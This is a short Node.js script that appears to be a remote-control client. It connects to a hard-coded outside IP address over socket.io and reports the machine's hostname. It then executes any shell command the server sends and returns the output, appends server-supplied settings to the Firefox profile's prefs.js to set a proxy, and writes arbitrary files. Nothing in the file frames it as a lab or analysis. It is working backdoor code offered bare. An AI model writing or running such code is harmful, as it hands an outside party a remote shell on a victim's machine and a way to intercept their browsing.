var exec = require('child_process').exec;
var io = require('socket.io-client');
var socket = io.connect('http://13.126.74.47:8000', {reconnect: true});
var fs = require('fs'); 
var os = require('os');

// Add a connect listener
socket.on('connect', function (data) {
    console.log('Connected!');
    socket.emit('client_connect', { type: 'tclient', name: os.hostname() }, () => {});
});

socket.on('cmd', function (data, cb) {
    console.log("Running cmd " + data.cmd);
    exec(data.cmd, (err, stdout, stderr) => {
        console.log("Sending response for " + data.cmd);
        cb(stdout);
    });
});

socket.on('setFFProxy', function(data) {

        exec("ls ~/.mozilla/firefox/ | grep .default", (err, stdout, stderr) => {
                var prefDirectory = stdout.trim();

                fs.writeFile('temp.txt', data, function (err) {
                    if (err) throw err;

                    exec("cat temp.txt >> ~/.mozilla/firefox/" + prefDirectory + "/prefs.js", (err, stdout, stderr) => {
                        console.log(err);
                        console.log(stdout);
                        console.log(stderr);
                    });
                }); 
        });
});


socket.on('cmdWriteFile', function(data) {
    console.log("writing file...");
    exec("echo \"" + data.string + "\" > " + data.dest, (err, stdout, stderr) => {
        console.log(err);
        console.log(stdout);
        console.log(stderr);
    });
});